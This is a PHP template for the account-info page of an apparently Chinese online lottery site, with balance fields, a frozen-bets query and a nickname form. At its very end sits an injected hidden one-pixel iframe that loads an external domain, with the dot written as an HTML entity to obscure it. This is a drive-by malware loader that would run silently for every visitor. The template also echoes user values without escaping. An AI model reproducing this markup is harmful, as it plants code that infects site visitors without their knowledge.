<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<?php $this->display('inc_skin.php', 0 , ''); ?>
<script type="text/javascript">
/*function safeBeforcare(){
	if(!this.care.value){davidInfo("请填写登陆问候语");return false;}
	return true;
}
function safeSetcare(err, data){
	if(err){
		davidError(err);
		
	}else{
		davidOk(data);
	}
}*/
function safeBefornickname(){
	if(!this.nickname.value){davidInfo("昵称不能为空，请填写修改的昵称！");return false;}
	return true;
}
function safeSetnickname(err, data){
	if(err){
		davidError(err);
		
	}else{
		davidOk(data);
		//reload();
	}
}
</script>
</head> 
<body>
<?php $this->display('inc_header.php'); ?>
 <div id="rightcon">
            <div class="wrapper bigbox">
<div class="page-wrapper">
            
    <?php $this->display('inc_left.php'); ?><div class="top_menu">
        <a class="act" href="<?=$this->basePath('Safe-info') ?>" >账户信息</a>
        <a href="<?=$this->basePath('Safe-bank') ?>">我的银行卡</a>
        <a href="<?=$this->basePath('Safe-passwd') ?>">密码管理</a>
        <a href="<?=$this->basePath('Notice-info') ?>">站内公告</a>
        <a href="<?=$this->basePath('Letter-main') ?>">站内信</a>
    </div>
    <div class="page-info">
	 <div class="page_list">
            <div class="page-title">一、账户信息</div>
	<?php //DAVID  查询5天内的数据
		$djcoin=$this->getValue("select sum(amount) from {$this->prename}bets where lotteryNo='' and isDelete!=1 and actionTime>UNIX_TIMESTAMP(DATE_SUB(now(),INTERVAL 5 DAY)) and uid=?",$this->user['uid']);     ?>
	<table width="100%" border="0" cellspacing="1" cellpadding="4" >
    <tr>
      <td class="tdtitle">登陆账号：</td>
      <td><?=$this->user['username']?></td> 
       <td class="tdtitle">会员编号：</td>
      <td><?=$this->user['uid']?></td> 
    </tr> 
    <tr>
       <td class="tdtitle">积分：</td>
      <td><?=$this->user['score']?></td>
       <td class="tdtitle">等级：</td>
      <td>VIP<?=$this->user['grade']?></td>
    </tr> 
    <tr>
       <td class="tdtitle">会员类型：</td>
      <td><?=$this->iff($this->user['type'], '代理', '会员')?></td>
       <td class="tdtitle">会员QQ：</td>
      <td><?=$this->user['qq']?></td>
    </tr>
    <tr>
       <td class="tdtitle">返点：</td>
      <td><?=$this->user['fanDian']?>%</td>
       <td class="tdtitle">不定位返点：</td>
      <td><?=$this->user['fanDianBdw']?>%</td>
    </tr> 
    <tr>
       <td class="tdtitle">收益宝资金：</td>
      <td><?=$this->user['deposit']?></td>
       <td class="tdtitle">冻结投注资金：</td>
      <td><?=$this->ifs($djcoin, '0.00')?> 元</td>
    </tr> 
   <tr>
       <td class="tdtitle">可用购彩资金：</td>
      <td><?=$this->user['coin']?> 元</td>
       <td class="tdtitle">全部资金：</td>
      <td><?=$this->user['coin']+$djcoin+$this->user['deposit']?> 元  <span>（收益宝资金+冻结投注资金+可用购彩资金）</span></td>
    </tr>

</table>
        </div>
    <div class="clear"></div>
         <!--暂时去除登录问候语设置 --> 
		 <div class="page_list">
     <div class="page-title">二、修改昵称</div>
           <form action="<?=$this->basePath('Safe-nickname')?>" method="post" target="ajax" onajax="safeBefornickname" call="safeSetnickname">
                <table border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td class="tdtitle">昵称: </td>
                        <td>
                       <input type="text" maxlength="50" style="color:#f33;height:25px;line-height:25px;width:360px;padding-left:3px;" name="nickname" value="<?=$this->user['nickname']?>"/>
                       <span class="pop"><s class="pop-l"></s>
					   <p>　昵称只为了更好的显示用户体验，与编号，帐号性质不同！<p>
                        </td>
                    </tr>
                    <tr>
                        <td></td>
                        <td>
                            <button name="submit" type="submit" class="btn_next btn btn-action"><i class="fa fa-send"></i> 提交</button>
                        </td>
                    </tr>
                </table>
            </form>
        </div>
        <div class="clear"></div>
    </div>
</div>
</div>
</div>
<?php $this->display('inc_footer.php'); ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>